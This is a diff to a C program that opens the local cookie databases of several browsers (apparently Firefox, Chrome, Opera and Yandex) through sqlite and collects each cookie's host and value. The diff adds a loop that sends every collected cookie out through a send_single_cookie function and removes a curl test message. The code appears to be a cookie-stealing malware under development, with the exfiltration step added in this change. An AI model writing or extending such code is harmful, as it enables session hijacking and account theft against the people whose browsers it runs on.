@@ -67,14 +67,10 @@ int main(void)
         local_machine.FF, local_machine.CH,
         local_machine.OP, local_machine.YA);
 
+
     /* Here we go. */
     local_container = calloc(1, sizeof(cookies_datatype));
     collect_data(local_machine);
-
-    CURL* curl = curl_easy_init();
-    if (curl) printf("Initialised successful!!!\n");
-    else printf("Initialised, but not so successful...\n");
-    curl_easy_cleanup(curl);
 
     /* Just in case. */
     for (int i = 0; i < offset; i++)
@@ -83,6 +79,15 @@ int main(void)
             i,
             local_container[i].host,
             local_container[i].value);
+    }
+
+    /* Execute send function for every cookie pair. */
+    uint8_t status;
+    for (int i = 0; i < offset; i++)
+    {
+        status = send_single_cookie(local_container[i]);
+        if (!status)
+            break;
     }
 
     return 0;
@@ -250,9 +255,9 @@ static int callback(void* bt, int argc, char** argv, char **colname)
 void get_sql(const char* sql_path, uint8_t bt)
 {
     sqlite3* database;
-    char* err = 0;
-    int s_code;
-    char request[50];
+    char*    err        = 0;
+    int      s_code;
+    char     request[50];
 
     s_code = sqlite3_open(sql_path, &database);
 
